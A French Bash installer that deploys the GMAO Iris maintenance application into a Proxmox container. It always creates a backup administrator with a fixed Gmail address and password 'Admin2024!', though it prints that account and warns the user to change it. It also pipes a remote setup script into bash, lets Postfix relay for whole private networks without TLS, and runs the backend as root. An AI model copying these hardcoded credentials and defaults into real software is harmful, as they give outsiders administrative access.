#!/usr/bin/env bash

###############################################################################
# GMAO Iris v1.0 - Script d'Installation Automatique Proxmox
# 
# Description: Installation complète et automatique de GMAO Iris sur Proxmox
# Inclut: MongoDB, Node.js, Python, Nginx, Supervisor, Postfix (SMTP)
# 
# Usage: ./gmao-iris-v1-install.sh
# 
# Auteur: Grèg
# Version: 1.0
# Date: Octobre 2025
###############################################################################

set -e

# Couleurs pour l'affichage
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Fonctions d'affichage
msg_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

msg_ok() {
    echo -e "${GREEN}[OK]${NC} $1"
}

msg_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

msg_warn() {
    echo -e "${YELLOW}[WARN]${NC} $1"
}

show_header() {
    clear
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║                                                                ║"
    echo "║              GMAO IRIS v1.0 - Installation                     ║"
    echo "║           Système de Gestion de Maintenance                   ║"
    echo "║                                                                ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo ""
}

# Vérifier si on est sur Proxmox
check_proxmox() {
    if ! command -v pct &> /dev/null; then
        msg_error "Ce script doit être exécuté sur un serveur Proxmox VE"
        exit 1
    fi
    msg_ok "Environnement Proxmox détecté"
}

# Configuration interactive
configure_installation() {
    show_header
    echo "Configuration de l'installation"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    
    # Container ID
    read -p "ID du container LXC [100]: " CTID
    CTID=${CTID:-100}
    
    # Vérifier si le container existe déjà
    if pct status $CTID &> /dev/null; then
        msg_warn "Le container $CTID existe déjà!"
        read -p "Voulez-vous le supprimer et recréer? (y/n): " CONFIRM
        if [[ $CONFIRM =~ ^[Yy]$ ]]; then
            msg_info "Suppression du container $CTID..."
            pct stop $CTID 2>/dev/null || true
            pct destroy $CTID
            msg_ok "Container supprimé"
        else
            msg_error "Installation annulée"
            exit 1
        fi
    fi
    
    # Ressources
    read -p "RAM (Mo) [4096]: " RAM
    RAM=${RAM:-4096}
    
    read -p "CPU cores [2]: " CORES
    CORES=${CORES:-2}
    
    read -p "Disque (Go) [20]: " DISK
    DISK=${DISK:-20}
    
    # Réseau
    read -p "Configuration réseau - DHCP ou Statique? (dhcp/static) [dhcp]: " NETWORK_TYPE
    NETWORK_TYPE=${NETWORK_TYPE:-dhcp}
    
    if [[ $NETWORK_TYPE == "static" ]]; then
        read -p "Adresse IP (format: 192.168.1.100/24): " IP_ADDRESS
        read -p "Passerelle: " GATEWAY
        NET_CONFIG="ip=${IP_ADDRESS},gw=${GATEWAY}"
    else
        NET_CONFIG="ip=dhcp"
    fi
    
    # Mot de passe root
    echo ""
    read -sp "Mot de passe root du container: " ROOT_PASSWORD
    echo ""
    while [[ ${#ROOT_PASSWORD} -lt 8 ]]; do
        msg_error "Le mot de passe doit contenir au moins 8 caractères"
        read -sp "Mot de passe root du container: " ROOT_PASSWORD
        echo ""
    done
    
    # Repository GitHub
    read -p "Le dépôt GitHub est-il public? (y/n) [y]: " IS_PUBLIC
    IS_PUBLIC=${IS_PUBLIC:-y}
    
    read -p "URL du dépôt GitHub [https://github.com/Kinder0083/GMAO.git]: " REPO_URL
    REPO_URL=${REPO_URL:-https://github.com/Kinder0083/GMAO.git}
    
    if [[ ! $IS_PUBLIC =~ ^[Yy]$ ]]; then
        msg_warn "Pour un dépôt privé, vous aurez besoin d'un Personal Access Token"
        read -p "GitHub Username: " GIT_USERNAME
        read -sp "GitHub Personal Access Token: " GIT_TOKEN
        echo ""
        REPO_URL="https://${GIT_USERNAME}:${GIT_TOKEN}@github.com/${GIT_USERNAME}/GMAO.git"
    fi
    
    read -p "Branche [main]: " BRANCH
    BRANCH=${BRANCH:-main}
    
    # Administrateur
    echo ""
    echo "Configuration du compte administrateur:"
    read -p "Email admin: " ADMIN_EMAIL
    while [[ -z "$ADMIN_EMAIL" ]]; do
        msg_error "L'email est obligatoire"
        read -p "Email admin: " ADMIN_EMAIL
    done
    
    read -sp "Mot de passe admin: " ADMIN_PASS
    echo ""
    while [[ ${#ADMIN_PASS} -lt 8 ]]; do
        msg_error "Le mot de passe doit contenir au moins 8 caractères"
        read -sp "Mot de passe admin: " ADMIN_PASS
        echo ""
    done
    
    read -p "Prénom admin: " ADMIN_FIRSTNAME
    ADMIN_FIRSTNAME=${ADMIN_FIRSTNAME:-Admin}
    
    read -p "Nom admin: " ADMIN_LASTNAME
    ADMIN_LASTNAME=${ADMIN_LASTNAME:-User}
    
    # Résumé
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "Résumé de la configuration:"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "Container ID: $CTID"
    echo "RAM: ${RAM}Mo"
    echo "CPU: ${CORES} cores"
    echo "Disque: ${DISK}Go"
    echo "Réseau: $NETWORK_TYPE"
    echo "Repository: ${REPO_URL//:*@/:***@}"  # Masquer le token
    echo "Branche: $BRANCH"
    echo "Admin: $ADMIN_FIRSTNAME $ADMIN_LASTNAME ($ADMIN_EMAIL)"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    
    read -p "Confirmer l'installation? (y/n): " FINAL_CONFIRM
    if [[ ! $FINAL_CONFIRM =~ ^[Yy]$ ]]; then
        msg_error "Installation annulée"
        exit 1
    fi
}

# Créer le container LXC
create_container() {
    msg_info "Création du container LXC..."
    
    # Télécharger le template Debian 12 si nécessaire
    if ! pveam list local | grep -q "debian-12"; then
        msg_info "Téléchargement du template Debian 12..."
        pveam download local debian-12-standard_12.7-1_amd64.tar.zst
    fi
    
    # Créer le container
    pct create $CTID local:vztmpl/debian-12-standard_12.7-1_amd64.tar.zst \
        --arch amd64 \
        --cores $CORES \
        --hostname gmao-iris \
        --memory $RAM \
        --net0 name=eth0,bridge=vmbr0,$NET_CONFIG \
        --onboot 1 \
        --ostype debian \
        --rootfs local-lvm:$DISK \
        --unprivileged 1 \
        --features nesting=1 \
        --password "$ROOT_PASSWORD"
    
    msg_ok "Container créé avec ID: $CTID"
    
    # Démarrer le container
    msg_info "Démarrage du container..."
    pct start $CTID
    sleep 5
    msg_ok "Container démarré"
    
    # Configurer les locales
    msg_info "Configuration des locales..."
    pct exec $CTID -- bash -c "
        export DEBIAN_FRONTEND=noninteractive
        apt-get update -qq
        apt-get install -y -qq locales
        sed -i '/en_US.UTF-8/s/^# //g' /etc/locale.gen
        sed -i '/fr_FR.UTF-8/s/^# //g' /etc/locale.gen
        locale-gen
        update-locale LANG=fr_FR.UTF-8
        export LANG=fr_FR.UTF-8
        export LC_ALL=fr_FR.UTF-8
    "
    msg_ok "Locales configurées"
}

# Installer les dépendances système
install_system_dependencies() {
    msg_info "Installation des dépendances système..."
    
    pct exec $CTID -- bash -c "
        export DEBIAN_FRONTEND=noninteractive
        export LANG=fr_FR.UTF-8
        export LC_ALL=fr_FR.UTF-8
        
        apt-get update -qq
        apt-get upgrade -y -qq
        apt-get install -y -qq curl wget git gnupg ca-certificates apt-transport-https \
            software-properties-common build-essential supervisor nginx ufw \
            python3 python3-pip python3-venv mailutils
    " 2>&1 | grep -E "(ERROR|FATAL)" || true
    
    msg_ok "Dépendances système installées"
}

# Installer Node.js
install_nodejs() {
    msg_info "Installation de Node.js 20.x..."
    
    pct exec $CTID -- bash -c "
        curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
        apt install -y nodejs
        npm install -g yarn
    "
    
    msg_ok "Node.js et Yarn installés"
}

# Installer MongoDB
install_mongodb() {
    msg_info "Installation de MongoDB 7.0..."
    
    pct exec $CTID -- bash -c "
        curl -fsSL https://www.mongodb.org/static/pgp/server-7.0.asc | \
            gpg -o /usr/share/keyrings/mongodb-server-7.0.gpg --dearmor
        
        echo 'deb [ signed-by=/usr/share/keyrings/mongodb-server-7.0.gpg ] \
            http://repo.mongodb.org/apt/debian bookworm/mongodb-org/7.0 main' | \
            tee /etc/apt/sources.list.d/mongodb-org-7.0.list
        
        apt update
        apt install -y mongodb-org
        
        systemctl start mongod
        systemctl enable mongod
    "
    
    msg_ok "MongoDB installé et démarré"
}

# Installer et configurer Postfix (SMTP)
install_postfix() {
    msg_info "Installation et configuration de Postfix (SMTP)..."
    
    pct exec $CTID -- bash -c "
        # Configuration non-interactive
        debconf-set-selections <<< 'postfix postfix/mailname string gmao-iris.local'
        debconf-set-selections <<< 'postfix postfix/main_mailer_type string \"Internet Site\"'
        
        export DEBIAN_FRONTEND=noninteractive
        apt install -y postfix
        
        # Configuration Postfix
        cat > /etc/postfix/main.cf <<'POSTFIX_EOF'
smtpd_banner = \$myhostname ESMTP
biff = no
append_dot_mydomain = no
readme_directory = no
compatibility_level = 2

# TLS disabled for local use
smtpd_tls_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
smtpd_tls_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
smtpd_use_tls=no
smtpd_tls_session_cache_database = btree:\${data_directory}/smtpd_scache
smtp_tls_session_cache_database = btree:\${data_directory}/smtp_scache

# Network configuration
myhostname = gmao-iris.local
myorigin = /etc/mailname
mydestination = gmao-iris.local, localhost.localdomain, localhost
relayhost = 
mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128 192.168.0.0/16 10.0.0.0/8
mailbox_size_limit = 0
recipient_delimiter = +
inet_interfaces = all
inet_protocols = ipv4

# Local configuration
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
home_mailbox = Maildir/
POSTFIX_EOF

        # Aliases
        cat > /etc/aliases <<'ALIAS_EOF'
mailer-daemon: postmaster
postmaster: root
nobody: root
hostmaster: root
usenet: root
news: root
webmaster: root
www: root
ftp: root
abuse: root
noc: root
security: root
root: root
noreply: root
ALIAS_EOF

        newaliases
        
        # Redémarrer Postfix
        systemctl restart postfix
        systemctl enable postfix
    "
    
    msg_ok "Postfix installé et configuré"
}

# Cloner et configurer l'application
setup_application() {
    msg_info "Clonage et configuration de l'application..."
    
    # Obtenir l'IP du container
    CONTAINER_IP=$(pct exec $CTID -- hostname -I | awk '{print $1}')
    
    pct exec $CTID -- bash -c "
        export LANG=fr_FR.UTF-8
        export LC_ALL=fr_FR.UTF-8
        
        # Créer le répertoire et cloner
        mkdir -p /opt/gmao-iris
        cd /opt
        
        # Supprimer le dossier s'il existe déjà
        rm -rf gmao-iris
        
        # Cloner le dépôt
        git clone -b $BRANCH $REPO_URL gmao-iris
        
        if [ ! -d '/opt/gmao-iris/backend' ]; then
            echo 'Erreur: Le clonage a échoué. Vérifiez l'URL du dépôt et les permissions.'
            exit 1
        fi
        
        cd /opt/gmao-iris
        
        # Configuration Backend
        cat > /opt/gmao-iris/backend/.env <<ENV_EOF
MONGO_URL=mongodb://localhost:27017
DB_NAME=gmao_iris
SECRET_KEY=\$(openssl rand -hex 32)
ALGORITHM=HS256
ACCESS_TOKEN_EXPIRE_MINUTES=10080
PORT=8001
HOST=0.0.0.0

# Email Configuration (Postfix local)
SMTP_HOST=localhost
SMTP_PORT=25
SMTP_FROM=noreply@gmao-iris.local
SMTP_FROM_NAME=GMAO Iris
APP_URL=http://$CONTAINER_IP
ENV_EOF

        # Configuration Frontend
        cat > /opt/gmao-iris/frontend/.env <<FRONTEND_EOF
REACT_APP_BACKEND_URL=http://$CONTAINER_IP
NODE_ENV=production
FRONTEND_EOF

        # Installation des dépendances Backend
        cd /opt/gmao-iris/backend
        python3 -m venv venv
        source venv/bin/activate
        pip install --upgrade pip -q
        pip install -r requirements.txt -q
        deactivate
        
        # Installation et build Frontend
        cd /opt/gmao-iris/frontend
        yarn install --production=false --silent
        yarn build
    " 2>&1 | grep -v "warning" | grep -v "deprecated" || {
        msg_error "Erreur lors de la configuration de l'application"
        msg_error "Vérifiez que le dépôt GitHub est accessible et public"
        exit 1
    }
    
    msg_ok "Application configurée"
}

# Créer les utilisateurs administrateurs
create_admin_users() {
    msg_info "Création des comptes administrateurs..."
    
    pct exec $CTID -- bash -c "cat > /tmp/create_admins.py <<'PYTHON_EOF'
import asyncio
from motor.motor_asyncio import AsyncIOMotorClient
from passlib.context import CryptContext
from datetime import datetime
import uuid
import sys

async def create_admin(email, password, prenom, nom):
    client = AsyncIOMotorClient('mongodb://localhost:27017')
    db = client.gmao_iris
    pwd_context = CryptContext(schemes=['bcrypt'], deprecated='auto', bcrypt__rounds=10)
    
    hashed_password = pwd_context.hash(password)
    
    admin_user = {
        'id': str(uuid.uuid4()),
        'email': email,
        'password': hashed_password,
        'prenom': prenom,
        'nom': nom,
        'role': 'ADMIN',
        'telephone': '',
        'service': None,
        'statut': 'actif',
        'dateCreation': datetime.utcnow(),
        'derniereConnexion': datetime.utcnow(),
        'firstLogin': False,
        'permissions': {
            'dashboard': {'view': True, 'edit': True, 'delete': True},
            'workOrders': {'view': True, 'edit': True, 'delete': True},
            'assets': {'view': True, 'edit': True, 'delete': True},
            'preventiveMaintenance': {'view': True, 'edit': True, 'delete': True},
            'inventory': {'view': True, 'edit': True, 'delete': True},
            'locations': {'view': True, 'edit': True, 'delete': True},
            'vendors': {'view': True, 'edit': True, 'delete': True},
            'reports': {'view': True, 'edit': True, 'delete': True}
        }
    }
    
    existing = await db.users.find_one({'email': email})
    if existing:
        admin_user['id'] = existing.get('id', str(uuid.uuid4()))
        await db.users.update_one({'email': email}, {'\$set': admin_user})
    else:
        await db.users.insert_one(admin_user)
    
    print(f'Admin créé/mis à jour: {email}')
    client.close()

async def main():
    # Admin principal
    await create_admin(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    
    # Admin de secours
    await create_admin('buenogy@gmail.com', 'Admin2024!', 'Support', 'Admin')

asyncio.run(main())
PYTHON_EOF
"
    
    # Exécuter le script
    pct exec $CTID -- bash -c "
        cd /opt/gmao-iris/backend
        source venv/bin/activate
        python3 /tmp/create_admins.py '$ADMIN_EMAIL' '$ADMIN_PASS' '$ADMIN_FIRSTNAME' '$ADMIN_LASTNAME'
        rm -f /tmp/create_admins.py
    "
    
    msg_ok "Comptes administrateurs créés"
}

# Configurer Supervisor (Backend)
configure_supervisor() {
    msg_info "Configuration de Supervisor..."
    
    pct exec $CTID -- bash -c "
        cat > /etc/supervisor/conf.d/gmao-iris-backend.conf <<SUPERVISOR_EOF
[program:gmao-iris-backend]
directory=/opt/gmao-iris/backend
command=/opt/gmao-iris/backend/venv/bin/uvicorn server:app --host 0.0.0.0 --port 8001
user=root
autostart=true
autorestart=true
stderr_logfile=/var/log/gmao-iris-backend.err.log
stdout_logfile=/var/log/gmao-iris-backend.out.log
environment=PYTHONUNBUFFERED=1
SUPERVISOR_EOF

        supervisorctl reread
        supervisorctl update
        supervisorctl start gmao-iris-backend
    "
    
    msg_ok "Supervisor configuré"
}

# Configurer Nginx
configure_nginx() {
    msg_info "Configuration de Nginx..."
    
    pct exec $CTID -- bash -c "
        # Supprimer la config par défaut
        rm -f /etc/nginx/sites-enabled/default
        
        # Créer la configuration GMAO Iris
        cat > /etc/nginx/sites-available/gmao-iris <<'NGINX_EOF'
server {
    listen 80;
    server_name _;
    
    client_max_body_size 25M;
    
    # Frontend
    location / {
        root /opt/gmao-iris/frontend/build;
        try_files \$uri \$uri/ /index.html;
    }
    
    # Backend API
    location /api {
        proxy_pass http://localhost:8001;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_cache_bypass \$http_upgrade;
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }
}
NGINX_EOF

        # Activer la configuration
        ln -sf /etc/nginx/sites-available/gmao-iris /etc/nginx/sites-enabled/
        
        # Tester et recharger Nginx
        nginx -t && systemctl reload nginx
    "
    
    msg_ok "Nginx configuré"
}

# Configurer le Firewall
configure_firewall() {
    msg_info "Configuration du firewall..."
    
    pct exec $CTID -- bash -c "
        ufw --force enable
        ufw allow 22/tcp
        ufw allow 80/tcp
        ufw allow 443/tcp
        ufw reload
    "
    
    msg_ok "Firewall configuré"
}

# Afficher le résumé
show_summary() {
    CONTAINER_IP=$(pct exec $CTID -- hostname -I | awk '{print $1}')
    
    clear
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║                                                                ║"
    echo "║         ✅ INSTALLATION TERMINÉE AVEC SUCCÈS !                 ║"
    echo "║                                                                ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "  GMAO IRIS v1.0 - Informations d'accès"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "🌐 URL de l'application:"
    echo "   http://$CONTAINER_IP"
    echo ""
    echo "🔐 Compte administrateur principal:"
    echo "   Email:        $ADMIN_EMAIL"
    echo "   Mot de passe: [celui que vous avez défini]"
    echo ""
    echo "🔐 Compte administrateur de secours:"
    echo "   Email:        buenogy@gmail.com"
    echo "   Mot de passe: Admin2024!"
    echo ""
    echo "📧 SMTP Configuration:"
    echo "   Serveur:      Postfix (local)"
    echo "   Port:         25"
    echo "   From:         noreply@gmao-iris.local"
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "  Commandes utiles"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "Entrer dans le container:"
    echo "  pct enter $CTID"
    echo ""
    echo "Services:"
    echo "  supervisorctl status"
    echo "  systemctl status mongod"
    echo "  systemctl status nginx"
    echo "  systemctl status postfix"
    echo ""
    echo "Logs backend:"
    echo "  tail -f /var/log/gmao-iris-backend.out.log"
    echo "  tail -f /var/log/gmao-iris-backend.err.log"
    echo ""
    echo "Logs email (Postfix):"
    echo "  tail -f /var/log/mail.log"
    echo "  mailq  # Voir la file d'attente"
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "📚 Documentation complète:"
    echo "   /opt/gmao-iris/INSTALLATION_PROXMOX_COMPLET.md"
    echo ""
    echo "⚠️  IMPORTANT: Changez le mot de passe du compte de secours !"
    echo ""
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║        Développé par Grèg - © 2025 GMAO Iris v1.0             ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo ""
}

# Fonction principale
main() {
    show_header
    
    # Vérifier Proxmox
    check_proxmox
    
    # Configuration
    configure_installation
    
    echo ""
    msg_info "Début de l'installation..."
    echo ""
    
    # Étapes d'installation
    create_container
    install_system_dependencies
    install_nodejs
    install_mongodb
    install_postfix
    setup_application
    create_admin_users
    configure_supervisor
    configure_nginx
    configure_firewall
    
    # Résumé
    show_summary
}

# Gestion des erreurs
trap 'msg_error "Une erreur est survenue. Installation interrompue."; exit 1' ERR

# Exécution
main "$@"
